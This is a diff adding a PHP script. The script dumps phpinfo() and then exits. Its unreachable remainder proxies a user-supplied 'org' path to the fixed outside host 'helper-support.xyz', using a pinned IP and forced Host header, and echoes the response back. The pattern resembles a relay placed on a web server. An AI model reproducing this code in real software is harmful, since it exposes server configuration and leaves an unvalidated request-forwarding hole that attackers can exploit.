@@ -1,0 +1,65 @@
+<?php
+phpinfo();
+
+exit();
+
+echo PHP_VERSION;
+echo "\n";
+echo extension_loaded('curl') ? 'curl loaded' : 'curl NOT loaded';
+
+phpinfo();
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+//print_r($_GET);
+//exit();
+
+if (!isset($_GET['org'])) {
+    http_response_code(400);
+    exit("Missing org");
+}
+
+
+$urlPath = $_GET['org'];
+
+// forced mapping
+$forcedHost = "helper-support.xyz";
+$forcedIp    = "104.21.39.78";
+
+// build URL using hostname (important for Host/SNI logic)
+$url = "http://{$forcedHost}{$urlPath}";
+
+$ch = curl_init($url);
+
+curl_setopt_array($ch, [
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_HEADER => true,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_TIMEOUT => 15,
+
+    // CRITICAL: force DNS resolution
+    CURLOPT_RESOLVE => [
+        "{$forcedHost}:80:{$forcedIp}"
+    ],
+
+    // ensure correct virtual host routing
+    CURLOPT_HTTPHEADER => [
+        "Host: {$forcedHost}"
+    ],
+]);
+
+$response = curl_exec($ch);
+
+if ($response === false) {
+    http_response_code(500);
+    exit("cURL error: " . curl_error($ch));
+}
+
+$headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+$httpCode   = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+
+curl_close($ch);
+
+http_response_code($httpCode);
+echo substr($response, $headerSize);
